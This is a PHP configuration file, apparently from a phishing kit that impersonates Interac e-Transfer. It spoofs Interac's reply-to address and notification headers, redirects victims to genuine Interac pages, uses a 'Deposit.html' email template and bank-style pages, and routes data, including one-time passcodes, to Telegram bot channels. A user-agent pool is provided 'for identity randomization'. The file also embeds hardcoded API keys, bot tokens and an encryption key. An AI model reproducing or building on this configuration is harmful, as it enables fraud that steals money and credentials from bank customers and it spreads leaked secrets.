
<?php
// PHP Configuration for SARAH-CORE
// Located at /config/config.php

function getSystemConfig() {
    $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? "https" : "http";
    $host = $_SERVER['HTTP_HOST'] ?? 'localhost:3002';
    $dynamic_url = "{$protocol}://{$host}";

    return [
        'general' => [
            'sender_name' => 'JENNIFER EDWARDS',
            'sendername' => 'JENNIFER EDWARDS',
            'app_name' => 'RBOS OS CORE',
            'app_url' => getenv('APP_URL') ?: $dynamic_url,
            'base_path' => '',
            'timezone' => 'America/Edmonton',
            'debug_mode' => false,
            'admin_user' => 'admin',
            'admin_pass_hash' => '$2y$12$oRWlUGLZq81yYgZYjJs5u.9yycvypFh1qzj9HCctOJDFrRIIcOybW',
            'admin_email' => 'admin@rbos.net',
            'session_timeout_sec' => 900,
            'csrf_token_length' => 32,
            'cookie_secure' => true,
            'cookie_httponly' => true,
            'cookie_samesite' => 'Lax',
            'rate_limit_enabled' => true,
            'rate_limit_per_ip_per_min' => 60,
            'encryption_key' => 'a3f91b6cd024e8c29b76a149efcc5d42',
            'gemini_api_key' => getenv('GEMINI_API_KEY') ?: 'AIzaSyDXAD-SoyiDl4PI4a6-fTL91GdUqT-zRY4',
        ],
        'modes' => [
            'hacker_mode' => false,
            'god_mode' => false,
            'developer_mode' => false,
            'experimental_ui' => false,
        ],
        'contact' => [
            'support_email' => 'support@rbos.net',
            'reply_to_email' => 'notify@payments.interac.ca', // Keep Interac for email templates
            'reply_to_name' => 'Interac e-Transfer', // Keep Interac for email templates
            'bounce_email' => 'bounces@rbos.net',
            'unsubscribe' => '',
            'unsubscribe_email' => 'unsubscribe@rbos.net',
            'physical_address' => 'Neural Heights, Cloud City',
            'organization' => 'Neural Systems Corp',
            'feedback_id' => 'rbos-feedback-2024',
        ],
        'smtp' => [
            'host' => 'smtp.rbos.net',
            'port' => 587,
            'username' => getenv('SMTP_USERNAME_PRIMARY') ?: 'relay@rbos.net',
            'password' => getenv('SMTP_PASSWORD_PRIMARY') ?: '',
            'from_email' => 'relay@rbos.net',
            'encryption' => 'tls',
            'from_name' => 'RBOS-CORE System (Primary)',
        ],
        'smtp1' => [
            'host' => 'smtp1.rbos.net',
            'port' => 587,
            'username' => getenv('SMTP_USERNAME_FAILOVER') ?: 'relay1@rbos.net',
            'password' => getenv('SMTP_PASSWORD_FAILOVER') ?: '',
            'from_email' => 'relay1@rbos.net',
            'encryption' => 'tls',
            'from_name' => 'RBOS-CORE System (Failover)',
        ],
        'dkim' => [
            'domain' => 'rbos.net', // Align with RBOS branding
            'selector' => 'selector1',
            'private_key' => './config/dkim/private.key',
            'passphrase' => '',
        ],
        'telegram' => [
            'enabled' => true,
            'bot_token' => getenv('BOT_TOKEN') ?: '8332848335:AAGNajzDjVz2YwAtQfQMb6Y0adP5ikWhUHM',
            'chat_id' => getenv('TELEGRAM_CHAT_ID') ?: '-1002922644009',
        ],
        'otp' => [
            'enabled' => true,
            'bot_token' => getenv('OTP_BOT_TOKEN') ?: '8332848335:AAGNajzDjVz2YwAtQfQMb6Y0adP5ikWhUHM',
            'chat_id' => getenv('OTP_CHAT_ID') ?: '-1003169150482',
        ],
        'ADMIN' => [
            'enabled' => true,
            'bot_token' => getenv('ADMIN_BOT_TOKEN') ?: '8480568636:AAHc8uTzNaWSSJTLeMJ38BhzMzyjB8Wgo4A',
            'chat_id' => getenv('ADMIN_CHAT_ID') ?: '-1002922644009',
        ],
        'email_deliverability' => [
            'max_attempts' => 3,
            'retry_delay' => 5,
            'hard_bounce_ttl' => 2592000,
            'soft_bounce_ttl' => 86400,
            'disposable_domains' => [
                'tempmail.com', 'guerrillamail.com', '10minutemail.com', 'mailinator.com',
                'temp-mail.org', 'throwawaymail.com',
            ],
        ],
        'features' => [
            'ledger_enabled' => true,
            'csv_legacy_enabled' => true,
            'rollback_on_send_fail' => true,
            'idempotency_enabled' => true,
            'status_redirect_enabled' => true,
            'expiry_enforced' => true,
            'rate_limiting_enabled' => true,
            'suppression_list_enabled' => true,
            'dkim_signing_enabled' => true,
            'bounce_handling_enabled' => true,
        ],
        'transfer_settings' => [
            'transfer_expiry_days' => 30,
            'transfer_token_ttl_sec' => 2592000,
            'allow_overdraft' => false,
            'max_amount' => 10000.0,
            'min_amount' => 0.01,
            'transaction_id_length' => 8,
            'default_importance' => 'normal',
            'smtp_timeout' => 30,
            'smtp_timeout_sec' => 25,
            'file_lock_timeout' => 10,
            'current_smtp' => 'smtp',
            'transfer_statuses' => [
                'reserved', 'pending', 'completed', 'cancelled', 'declined', 'failed', 'expired', 'rolled_back'
            ],
            'final_statuses' => [
                'completed', 'cancelled', 'declined', 'expired'
            ],
            'transfer_redirects' => [
                'completed' => 'https://etransfer.interac.ca/deposited',
                'cancelled' => 'https://etransfer.interac.ca/cancelled',
                'declined' => 'https://etransfer.interac.ca/cancelled',
                'failed' => 'https://etransfer.interac.ca/error',
                'expired' => 'https://etransfer.interac.ca/expired',
            ],
        ],
        'ui' => [
            'primary_color' => '#ffcc00',
            'accent_color' => '#4a3f2e',
            'header_color' => '#4a3f2e',
        ],
        'pages' => [
            'home', 'accounts', 'payments', 'etransfer', 'cards', 'rewards', 'profile'
        ],
        'theme' => [
            'primary' => '#005eb8',
            'accent' => '#00b5e2',
            'secondary' => '#003f7d',
            'text' => '#ffffff',
            'radius' => 15,
            'glass' => 0.75,
            'icon' => 'assets/app_icon.jpg',
        ],
        'email_headers' => [
            'X-Entity-Ref' => 'transaction_id', 'X-Priority' => '3 (Normal)', 'Precedence' => 'bulk',
            'X-Account-Id' => 'interac-etransfer', 'X-System' => 'interac-notification',
            'X-Email-Type' => 'Transactional', 'X-Bounce-Key' => 'hashed_identifier',
            'X-Report-Abuse' => 'abuse@rbos.net', // Align with RBOS branding
            'X-Template-Version' => '2024.1',
            'X-Campaign-ID' => 'interac-etransfer-notification', 'X-Rate-Limit' => '1/3600',
            'List-Help' => 'support@rbos.net', // Align with RBOS branding
        ],
        'paths' => [
            'template_root' => './templates', 'email_template' => 'Deposit.html',
            'accounts_file' => './data/accounts.json', 'log_file' => './data/logs/transactions.log',
            'suppression_list_file' => './data/suppression_list.json', 'bounce_log_file' => './data/logs/bounces.log',
            'deliverability_log_file' => './data/logs/deliverability.log',
            'rate_limit_path' => './data/logs/rate_limits/', 'pending_file' => './data/pending.csv',
            'contacts_file' => './data/contacts.csv', 'transactions_file' => './data/transactions.log',
            'transfers_file' => './data/transfers.csv', 'money_lock_file' => './data/money.lock',
            'transfers_ledger_jsonl' => './data/transfers.jsonl',
            'transfers_ledger_index' => './data/transfers_index.json',
        ],
        'network_internet' => [
            'wifi_enabled' => true, 'mobile_data_enabled' => true, 'hotspot_enabled' => false,
            'airplane_mode' => false, 'vpn_enabled' => false, 'data_saver_enabled' => false,
            'data_usage_gb' => 12.7, 'preferred_network_type' => '5G', 'private_dns_mode' => 'automatic',
        ],
        'connected_devices' => [
            'bluetooth_enabled' => true, 'nfc_enabled' => true, 'cast_enabled' => true,
            'usb_mode' => 'file_transfer', 'paired_devices' => ['RBOS-BUDS X1', 'Core Display'], // Align with RBOS
            'nearby_share_enabled' => true,
        ],
        'display_options' => [
            'dark_mode' => true, 'adaptive_brightness' => true, 'screen_timeout_sec' => 30,
            'font_size' => 'default', 'wallpaper_url' => 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?q=80&w=2564&auto=format&fit=crop',
            'refresh_rate_hz' => 90, 'night_light_enabled' => false, 'screen_saver_enabled' => false,
            'color_mode' => 'adaptive',
        ],
        'sound_vibration' => [
            'media_volume' => 75, 'notification_volume' => 60, 'ring_volume' => 80, 'alarm_volume' => 70,
            'vibration_enabled' => true, 'do_not_disturb_enabled' => false, 'haptic_feedback_enabled' => true,
            'ringtone' => 'Digital Sunrise', // Align with RBOS
            'notification_sound' => 'Neural Ping', // Align with RBOS
        ],
        'storage_settings' => [
            'total_space_gb' => 256, 'used_space_gb' => 64.5, 'smart_storage_enabled' => true,
            'temporary_files_gb' => 2.1, 'system_files_gb' => 15.0, 'app_data_gb' => 25.3,
            'photos_videos_gb' => 18.0,
        ],
        'privacy_security' => [
            'camera_access' => true, 'microphone_access' => true, 'location_access' => true,
            'ad_id_reset_enabled' => false, 'google_location_accuracy' => true,
            'app_permissions_manager' => true, 'find_my_device_enabled' => true,
            'screen_lock_type' => 'pin', 'fingerprint_enabled' => true, 'face_unlock_enabled' => false,
            'last_security_check' => 'Oct 24, 2024',
            'security_updates_auto' => true,
        ],
        'accounts_google' => [
            'google_account' => 'admin@rbos.net', // Align with RBOS
            'auto_sync_data' => true,
            'backup_enabled' => true, 'device_name' => 'RBOS-CORE-X1', // Align with RBOS
            'personal_safety_enabled' => true,
        ],
        'accessibility_wellbeing' => [
            'talkback_enabled' => false, 'magnification_enabled' => false,
            'color_correction_enabled' => false, 'focus_mode_enabled' => false,
            'app_timers_enabled' => false, 'bedtime_mode_enabled' => false, 'grayscale_enabled' => false,
        ],
        'system_preferences' => [
            'language' => 'English (Canada)', // Align with RBOS
            'gestures_enabled' => true,
            'system_navigation' => 'gestures', 'date_time_auto' => true, 'time_format_24hr' => true, // Align with RBOS
            'system_updates_auto' => true, 'last_update_check' => 'Just now', // Align with RBOS
            'reset_options_available' => false, // Align with RBOS
        ],
        'about_phone' => [
            'model_name' => 'RBOS OS CORE X1', // Align with RBOS
            'android_version' => '14.0.0-MODULAR', // Align with RBOS
            'build_number' => 'RBOS.241024.001', // Align with RBOS
            'serial_number' => 'SN-4839-2938-1029', // Align with RBOS
            'uptime_days' => 12, 'kernel_version' => '6.1.0-neural-core', 'baseband_version' => 'R1-V22-4-TX',
        ],
        'email_settings' => [
            'default_format' => 'html', 'html_template_name' => 'Deposit.html',
        ],
    ];
}

// User-Agent pool for identity randomization
const USER_AGENT_POOL = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
    'Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.6099.109 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:109.0) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
];

function getRandomUserAgent() {
    global $USER_AGENT_POOL;
    return $USER_AGENT_POOL[array_rand($USER_AGENT_POOL)];
}
